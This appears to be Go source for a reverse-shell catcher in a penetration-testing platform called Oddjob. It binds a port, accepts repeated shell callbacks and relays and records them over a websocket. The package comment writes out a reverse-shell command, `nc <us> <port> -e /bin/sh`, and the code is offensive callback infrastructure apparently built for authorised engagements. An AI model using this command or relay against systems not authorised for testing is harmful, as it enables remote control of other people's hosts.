// Package shell catches reverse shells and relays them to Oddjob.
//
// An operator gets a command execution primitive on a host and wants
// a shell out of it. The classic move is `nc <us> <port> -e /bin/sh`
// and the classic problem is where "<us>" is: the operator's laptop
// is not reachable from the client's estate, and a listener on the
// Oddjob server is a listener on the thing holding the engagement's
// data.
//
// The Ghost is already the right place. It sits on infrastructure
// the engagement chose, it is already attributable, it already has
// `--network host` so a bind is a real bind, and it already holds a
// websocket OUT to Oddjob -- which is the only direction that works
// through NAT, and is how the bytes get home.
//
// # One listener, many callbacks
//
// The listener is not consumed by the first connection. It accepts,
// hands the socket to a stream, and goes straight back to accepting:
// a shell that dies at 2am and a payload that retries every minute
// should produce a second session, not silence. That is the whole
// reason this is an Accept loop and not a one-shot dial.
//
// # What is recorded
//
// Everything, in both directions, as bytes. The server pairs what
// was typed with what came back -- see app/shelltunnel.py, which is
// honest about that pairing being best effort, because a shell is a
// byte stream and `sh` emits no marker saying where one command's
// output ends.
package shell

import (
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"github.com/xsecurity-ai/oddjob/ghost/internal/socksrelay"
)

// ReadChunk bounds one DATA frame off a shell. Small, because this
// is interactive: a 1 MB buffer would mean a prompt sat unflushed
// until something filled it.
const ReadChunk = 16 * 1024

// IdleTimeout closes a session that has said nothing and been told
// nothing. A shell whose far end vanished without a FIN otherwise
// holds a stream and a row that both claim to be live.
const IdleTimeout = 2 * time.Hour

// Transport is the half of the tunnel this needs: frames in, frames
// out. Satisfied by socksrelay.WS and by a pipe in the tests.
type Transport interface {
	Recv(ctx context.Context) ([]byte, error)
	Send(ctx context.Context, b []byte) error
}

// Listener holds one port and relays every callback that lands on it.
type Listener struct {
	Port int

	t      Transport
	ln     net.Listener
	mu     sync.Mutex
	conns  map[uint32]net.Conn
	nextID atomic.Uint32
	sendMu sync.Mutex
}

// Open binds the port. Separate from Run so a caller learns that the
// port is unavailable immediately rather than from a goroutine --
// "could not bind 4444" is an answer the operator needs while they
// are still looking at the screen.
func Open(ctx context.Context, t Transport, port int) (*Listener, error) {
	var lc net.ListenConfig
	ln, err := lc.Listen(ctx, "tcp", ":"+strconv.Itoa(port))
	if err != nil {
		return nil, fmt.Errorf("shell: cannot listen on %d: %w", port, err)
	}
	addr, ok := ln.Addr().(*net.TCPAddr)
	if !ok {
		_ = ln.Close()
		return nil, fmt.Errorf("shell: %s is not a tcp address", ln.Addr())
	}
	return &Listener{Port: addr.Port, t: t, ln: ln,
		conns: map[uint32]net.Conn{}}, nil
}

// Run accepts callbacks until the context ends or the listener is
// closed. Each one becomes a stream; the loop continues either way.
func (l *Listener) Run(ctx context.Context) error {
	go l.pump(ctx)
	for {
		c, err := l.ln.Accept()
		if err != nil {
			// nil, deliberately: a cancelled context or a closed
			// listener is this shutting down on purpose, and
			// returning the error would make every clean stop look
			// like a failure in the agent's log.
			if ctx.Err() != nil || errors.Is(err, net.ErrClosed) {
				return nil //nolint:nilerr // a clean shutdown is not an error
			}
			// A failed accept is not a reason to stop listening. A
			// transient error -- a file-descriptor limit, a peer
			// that reset during the handshake -- must not end the
			// engagement's only way back in.
			continue
		}
		id := l.nextID.Add(1)
		l.mu.Lock()
		l.conns[id] = c
		l.mu.Unlock()
		// Announced BEFORE any bytes move, so the server has a
		// session to attach them to. A DATA frame for a stream the
		// server has never heard of has nowhere to go.
		_ = l.send(ctx, socksrelay.ARRIVED, id,
			[]byte(c.RemoteAddr().String()))
		go l.read(ctx, id, c)
	}
}

// read copies one callback's output home until it ends.
func (l *Listener) read(ctx context.Context, id uint32, c net.Conn) {
	defer l.drop(ctx, id)
	buf := make([]byte, ReadChunk)
	for {
		_ = c.SetReadDeadline(time.Now().Add(IdleTimeout))
		n, err := c.Read(buf)
		if n > 0 {
			if sendErr := l.send(ctx, socksrelay.DATA, id,
				buf[:n]); sendErr != nil {
				return
			}
		}
		if err != nil {
			return
		}
	}
}

// pump carries what the server sends down to the right socket.
func (l *Listener) pump(ctx context.Context) {
	for {
		raw, err := l.t.Recv(ctx)
		if err != nil {
			return
		}
		f, err := socksrelay.Decode(raw)
		if err != nil {
			// Framing is lost, not one frame: carrying on would feed
			// one session's bytes to another. The tunnel is dropped
			// and redialled, which is what the proxy relay does for
			// the same reason.
			return
		}
		l.mu.Lock()
		c := l.conns[f.Stream]
		l.mu.Unlock()
		if c == nil {
			continue
		}
		switch f.Kind {
		case socksrelay.DATA:
			if _, err := c.Write(f.Payload); err != nil {
				l.drop(ctx, f.Stream)
			}
		case socksrelay.CLOSE:
			l.drop(ctx, f.Stream)
		}
	}
}

func (l *Listener) drop(ctx context.Context, id uint32) {
	l.mu.Lock()
	c := l.conns[id]
	delete(l.conns, id)
	l.mu.Unlock()
	if c == nil {
		return
	}
	_ = c.Close()
	_ = l.send(ctx, socksrelay.CLOSE, id, nil)
}

// send serialises writes. A websocket is one connection and two
// goroutines writing to it interleave into something neither end can
// decode -- the failure this mutex exists for is silent corruption
// rather than an error.
func (l *Listener) send(ctx context.Context, kind byte, id uint32,
	payload []byte) error {
	b, err := socksrelay.Encode(kind, id, payload)
	if err != nil {
		return err
	}
	l.sendMu.Lock()
	defer l.sendMu.Unlock()
	return l.t.Send(ctx, b)
}

// Close stops listening and ends every live session.
func (l *Listener) Close() error {
	err := l.ln.Close()
	l.mu.Lock()
	for _, c := range l.conns {
		_ = c.Close()
	}
	l.conns = map[uint32]net.Conn{}
	l.mu.Unlock()
	return err
}

// Live is how many callbacks are currently connected.
func (l *Listener) Live() int {
	l.mu.Lock()
	defer l.mu.Unlock()
	return len(l.conns)
}

var _ io.Closer = (*Listener)(nil)
